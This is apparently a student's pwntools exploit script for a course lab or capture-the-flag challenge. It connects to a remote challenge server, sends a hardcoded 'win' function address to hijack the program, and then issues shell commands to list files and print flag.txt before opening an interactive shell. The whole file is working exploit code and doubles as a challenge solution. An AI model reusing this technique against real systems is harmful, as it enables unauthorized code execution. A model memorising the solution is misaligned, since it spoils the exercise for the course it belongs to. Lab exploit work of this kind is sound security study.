from pwn import *
import os

# connect to local binary process
# p = processs("./lab1-2.bin")

# hardcoded win function address
winFuncAddrDecimal = 4199183

winFuncAddrHex = hex(winFuncAddrDecimal)
#print(type(winFuncAddrHex)) # Testing code

winFuncAddrBytes = bytes(str(winFuncAddrDecimal), "utf-8")
#print(type(winFuncAddrBytes)) # Testing code

# connect to remote server process at port 7012
print("")
p = remote("csc748.hostbin.org", 7012)

# read response
response = p.recvuntil(b'\n').decode('utf-8')

# print response
# s = p.recv(15)
print(f"{response}")

# print win function addresses
print(f'The addres of "win" function in hex is: {winFuncAddrHex}')
print("")
print(f'The addres of "win" function in decimal is: {winFuncAddrDecimal}')
print("")
print(f'The addres of "win" function in bytes is: {winFuncAddrBytes}')

print("")
# send back hardcoded address of "win" fiction in decimal
# "win" function address is 0x40130f or 4199183 in decimal
print('Calling "win" function [+][+][+][+][+][+][+][+]')
p.sendline(winFuncAddrBytes)

# print flag.txt
p.sendline(b'echo ""')
p.sendline(b'echo "Listing and printing the flag [+][+][+][+][+]"')
p.sendline(b'echo ""')
p.sendline(b'ls -alh')
p.sendline(b'echo "";')
p.sendline(b'cat flag.txt')
p.sendline(b'echo ""')
# establish interactive session
p.interactive()
